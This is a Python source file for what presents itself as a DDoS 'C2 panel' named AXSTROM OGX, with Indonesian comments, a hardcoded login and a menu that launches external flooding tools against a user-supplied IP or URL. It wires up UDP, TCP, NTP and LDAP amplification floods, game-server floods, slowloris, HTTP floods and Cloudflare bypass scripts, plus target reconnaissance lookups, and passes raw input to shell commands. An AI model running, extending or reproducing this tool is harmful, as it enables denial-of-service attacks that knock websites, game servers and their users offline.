##############################
# INI DIBUAT OLEH AXSTROM OGX,JANGAN DI AKU AKUI PUNYA KALIAN YANG SOK JAGO ABUSER#
# JANGAN DIPAKE BUAT ABUSER KAYA BOCIL SEBELAH SOK JAGO             #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
 ░█████╗░██╗░░██╗░██████╗████████╗██████╗░░█████╗░
██╔══██╗╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
███████║░╚███╔╝░╚█████╗░░░░██║░░░██████╔╝██║░░██║
██╔══██║░██╔██╗░░╚═══██╗░░░██║░░░██╔══██╗██║░░██║
██║░░██║██╔╝╚██╗██████╔╝░░░██║░░░██║░░██║╚█████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░

    ''')
    time.sleep(0.6)
    clear()
    print(f'''


░█████╗░░██████╗░██╗░░██╗
██╔══██╗██╔════╝░╚██╗██╔╝
██║░░██║██║░░██╗░░╚███╔╝░
██║░░██║██║░░╚██╗░██╔██╗░
╚█████╔╝╚██████╔╝██╔╝╚██╗
░╚════╝░░╚═════╝░╚═╝░░╚═╝


    ''')
    time.sleep(0.6)
    clear()
    print(f'''

 ░█████╗░░██████╗░██╗░░██╗
██╔══██╗██╔════╝░╚██╗██╔╝
██║░░██║██║░░██╗░░╚███╔╝░
██║░░██║██║░░╚██╗░██╔██╗░
╚█████╔╝╚██████╔╝██╔╝╚██╗
░╚════╝░░╚═════╝░╚═╝░░╚═╝
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
    
░█████╗░██╗░░██╗░██████╗████████╗██████╗░░█████╗░
██╔══██╗╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
███████║░╚███╔╝░╚█████╗░░░░██║░░░██████╔╝██║░░██║
██╔══██║░██╔██╗░░╚═══██╗░░░██║░░░██╔══██╗██║░░██║
██║░░██║██╔╝╚██╗██████╔╝░░░██║░░░██║░░██║╚█████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mAXSTROM OGX \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to AXSTROM OGX PN! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: AXSTROM OGXr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools Axstrom     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBANNERS DDOS INI   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Jangan serang domain .gov/.gob/.edu/.mil  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Hanya Untuk Tes Server        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Jangan Dijual Goblok,Dan Jangan Di Aku Akui Punya Lu                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Jangan Di Pake Buat Abuse Kaya Bocil Tolol Sok Suhu Memek      \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. Jangan Lupa Bahagia          \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPort/Methode Ini     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-storm          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnfo-killer          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslowloris           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"         \x1b]2;AXSTROM OGX C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mAXSTROM OGX \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to AXSTROM OGX C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: AXSTROM OGXr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    print("")
    print("""
                        \x1b[38;2;0;212;14m╔═╗ \x1b[38;2;0;186;45m ═╗ ╦  ╔═\x1b[38;2;0;150;88m╗  ╔╦╗ \x1b[38;2;0;113;133m ╔╦╗ \x1b[38;2;0;83;168m ╔═╗ \x1b[38;2;0;49;147m ╔═╗
                        \x1b[38;2;0;212;14m╔═╝ \x1b[38;2;0;186;45m ╔╩╦╝  ║ \x1b[38;2;0;150;88m    ║║ \x1b[38;2;0;113;133m  ║║ \x1b[38;2;0;83;168m ║ ║ \x1b[38;2;0;49;147m ╚═╗
                        \x1b[38;2;0;212;14m╚═╝ \x1b[38;2;0;186;45m ╩ ╚═  ╚═\x1b[38;2;0;150;88m╝  ═╩╝ \x1b[38;2;0;113;133m ═╩╝ \x1b[38;2;0;83;168m ╚═╝ \x1b[38;2;0;49;147m ╚═╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to AXSTROM OGX C2 DDoS Panel        \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/hoaan1995/AXSTROM OGXDDoS \x1b[38;2;0;49;147m║
                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")

def main():
    menu()
    while(True):
        DDOS= input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@AXSTROM\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133mOGX\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if DDOS== "layer7" or DDOS== "LAYER7" or DDOS== "L7" or DDOS== "l7":
            layer7()
        elif DDOS== "layer4" or DDOS== "LAYER4" or DDOS== "L4" or DDOS== "l4":
            layer4()
        elif DDOS== "amp" or DDOS== "AMP" or DDOS== "amp/game" or DDOS== "amps/game" or DDOS== "amps/games" or DDOS== "amp/games" or DDOS== "AMP/GAME":
            amp_games()
        elif DDOS== "rule" or DDOS== "RULES" or DDOS== "rules" or DDOS== "RULES" or DDOS== "RULE34":
            rules()
        elif DDOS== "clear" or DDOS== "CLEAR" or DDOS== "CLS" or DDOS== "cls":
            main()
        elif DDOS== "ports" or DDOS== "port" or DDOS== "PORTS" or DDOS== "PORT":
            ports()
        elif DDOS== "tools" or DDOS== "tool" or DDOS== "TOOLS" or DDOS== "TOOL":
            tools()
        elif DDOS== "banner" or DDOS== "BANNER" or DDOS== "banners" or DDOS== "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "DDOS_Axstrom" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                os.system(f'./DDOS_Axstrom{ip} {port}')
            except IndexError:
                print('Usage: DDOS_Axstrom <ip> <port>')
                print('Example: DDOS_Axstrom127.0.0.1 9999')

        elif "Good_DDOS" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                time = DDOS.split()[3]
                os.system(f'perl good_DDOS.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: good_DDOS <ip> <port> <time>')
                print('Example: good_DDOD 127.0.0.1 9999 60')

        elif "destroy" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                time = DDOS.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                psize = DDOS.split()[3]
                time = DDOS.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                threads = DDOS.split()[3]
                time = DDOS.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in DDOS:
            try:
                method = DDOS.split()[1]
                ip = DDOS.split()[2]
                port = DDOS.split()[3]
                time = DDOS.split()[4]
                conns = DDOS.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in DDOS:
            try:
                method = DDOS.split()[1]
                ip = DDOS.split()[2]
                port = DDOS.split()[3]
                time = DDOS.split()[4]
                conns = DDOS.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# METHODS GAME BRO

        elif "ldap" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                thread = DDOS.split()[3]
                time = DDOS.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in DDOS:
            try:
                ip = DDOS.split()[1]
                throttle = DDOS.split()[2]
                threads = DDOS.split()[3]
                time = DDOS.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                throttle = DDOS.split()[3]
                time = DDOS.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS
    
        elif "slow" in DDOS:
            try:
                url = DDOS.split()[1]
                time = DDOS.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in DDOS:
            try:
                url = DDOS.split()[1]
                time = DDOS.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in DDOS:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in DDOS:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in DDOS:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in DDOS:
            try:
                url = DDOS.split()[1]
                per = DDOS.split()[2]
                time = DDOS.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in DDOS:
            try:
                url = DDOS.split()[1]
                time = DDOS.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in DDOS:
            try:
                url = DDOS.split()[1]
                time = DDOS.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in DDOS:
            try:
                url = DDOS.split()[1]
                time = DDOS.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in DDOS:
            try:
                ip = DDOS.split()[1]
                port = DDOS.split()[2]
                thread = DDOS.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in DDOS:
            try:
                url = DDOS.split()[1]
                time = DDOS.split()[2]
                thread = DDOS.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in DDOS:
            try:
                url = DDOS.split()[1]
                time = DDOS.split()[2]
                per = DDOS.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in DDOS:
            try:
                url = DDOS.split()[1]
                method = DDOS.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in DDOS:
            try:
                url = DDOS.split()[1]
                thread = DDOS.split()[2]
                method = DDOS.split()[3]
                time = DDOS.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in DDOS:
            try:
                url = DDOS.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

# BANNERS TOOLS BRO

        elif "Axstrom" in DDOS:
               print('─────────────────────────────────────────────────────────────────')
               print('─██████████████─████████──████████─██████████████─██████████████─')
               print('─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─')
               print('─██▒▒██████▒▒██─████▒▒██──██▒▒████─██▒▒██████████─██████▒▒██████─')
               print('─██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██───██▒▒██─────────────██▒▒██─────')
               print('─██▒▒██████▒▒██───████▒▒▒▒▒▒████───██▒▒██████████─────██▒▒██─────')
               print('─██▒▒▒▒▒▒▒▒▒▒██─────██▒▒▒▒▒▒██─────██▒▒▒▒▒▒▒▒▒▒██─────██▒▒██─────')
               print('─██▒▒██████▒▒██───████▒▒▒▒▒▒████───██████████▒▒██─────██▒▒██─────')
               print('─██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██───────────██▒▒██─────██▒▒██─────')
               print('─██▒▒██──██▒▒██─████▒▒██──██▒▒████─██████████▒▒██─────██▒▒██─────')
               print('─██▒▒██──██▒▒██─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─────██▒▒██─────')
               print('─██████──██████─████████──████████─██████████████─────██████─────')
               print('─────────────────────────────────────────────────────────────────')           

        elif "OGX" in DDOS:
               print('░█████╗░░██████╗░██╗░░██╗')
               print('██╔══██╗██╔════╝░╚██╗██╔╝')
               print('██║░░██║██║░░██╗░░╚███╔╝░')
               print('██║░░██║██║░░╚██╗░██╔██╗░')
               print('╚█████╔╝╚██████╔╝██╔╝╚██╗')
               print('░╚════╝░░╚═════╝░╚═╝░░╚═╝')

                
# TOOLS
        elif "geoip" in DDOS:
            try:
                ip = DDOS.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in DDOS:
            try:
                ip = DDOS.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in DDOS:
            try:
                ip = DDOS.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in DDOS:
            try:
                ip = DDOS.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in DDOS:
            try:
                ip = DDOS.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in DDOS:
            try:
                ip = DDOS.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in DDOS:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in DDOS:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW AMP METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = DDOS.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "Axstrom OGX"
    passwd = "Axstrom OGX"
    username = input("👑 Masukan Username: ")
    password = getpass.getpass(prompt='👑 Masukan Password: ')
    if username != user or password != passwd:
        print("")
        print("👑 Semoga Anda Bahagia")
        sys.exit(1)
    elif username == user and password == passwd:
        print("👑 Selamat Datang Di Axstrom DDOS C2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
